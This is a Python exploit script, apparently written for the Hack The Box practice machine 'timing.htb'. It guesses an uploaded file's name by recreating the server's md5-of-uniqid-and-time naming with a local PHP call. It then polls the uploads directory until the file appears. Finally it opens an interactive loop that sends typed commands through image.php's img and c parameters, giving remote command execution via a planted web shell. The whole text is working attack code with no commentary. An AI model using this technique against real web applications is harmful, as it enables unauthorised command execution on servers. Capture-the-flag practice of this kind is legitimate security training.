#!/usr/bin/python3

import subprocess
import requests

def fuzz(file_name):
    url = 'http://timing.htb/images/uploads/' + file_name
    res = requests.get(url)
    if res.status_code != 404:
        print(f'[+] Found the file at {url}')
        return True

def rce(file_name):
    prompt = '> '
    while True:
        command = input(prompt) #keeps alive the terminal
        url = f'http://timing.htb/image.php?img=images/uploads/{file_name}&c={command}'
        r = requests.get(url)
        print(r.text)

def main():
    while True:
        command = "/usr/bin/php -r \"\$file_hash=uniqid(); \$file_name=md5('\$file_hash' . time()) . '_' . basename('test.jpg'); echo \$file_name;\""
        string = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE)
        binary_name = string.stdout.read()
        file_name = binary_name.decode('utf-8')
        if fuzz(file_name):
            break
    rce(file_name)

if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass

